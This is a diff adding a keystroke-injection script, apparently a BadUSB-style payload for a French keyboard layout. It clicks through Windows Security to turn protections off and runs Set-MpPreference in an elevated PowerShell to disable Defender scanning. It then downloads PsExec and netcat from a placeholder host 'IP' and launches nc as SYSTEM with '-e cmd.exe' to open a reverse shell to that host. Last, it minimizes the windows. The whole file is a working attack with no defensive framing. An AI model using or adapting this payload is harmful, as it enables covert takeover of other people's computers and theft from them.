@@ -1,0 +1,69 @@
+layout(‘fr’);
+press(“GUI”);
+delay(200);
+type(“windows security”)
+delay(1000);
+press(“ENTER”);
+delay(1000);
+press(‘ENTER’)
+delay(1000)
+press(“TAB”);
+delay(200);
+press(“TAB”);
+delay(200);
+press(“TAB”);
+delay(200);
+press(“TAB”);
+delay(200);
+press(“ENTER”);
+delay(2000);
+press(“SPACE”);
+delay(200);
+press(“TAB”);
+delay(200);
+press(“TAB”);
+delay(200)
+press(‘TAB’)
+delay(500);
+press(“ENTER”);
+delay(500);
+press(“ALT F4”)
+press(“GUI r”);
+delay(100);
+type(‘cmd’);
+delay(1000);
+press(‘CTRL SHIFT ENTER’);
+delay(1000);
+press(‘TAB’);
+delay(200);
+press(‘TAB’);
+delay(200);
+press(‘ENTER’);
+delay(200)
+type(‘powershell’);
+delay(200);
+press(‘ENTER’)
+delay(200)
+type(‘Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend’);
+delay(200)
+press(‘ENTER’)
+delay(200)
+type(‘cd ../Temp’);
+press(‘ENTER’)
+type(‘Invoke-WebRequest http://IP/PsExec.exe -OutFile “PsExec.exe”’)
+delay(100)
+press(‘ENTER’)
+delay(500)
+type(‘Invoke-WebRequest http://IP/nc.exe -OutFile “nc.exe”’)
+delay(500)
+press(‘ENTER’)
+delay(400)
+type(“./PsExec.exe -i -accepteula -d -s C:/Windows/Temp/nc.exe IP PORT -e cmd.exe”)
+delay(200)
+press(‘ENTER’)
+delay(100)
+press(‘ENTER’)
+delay(200)
+press(‘GUI Down’)
+delay(1000)
+press(‘GUI Down’)
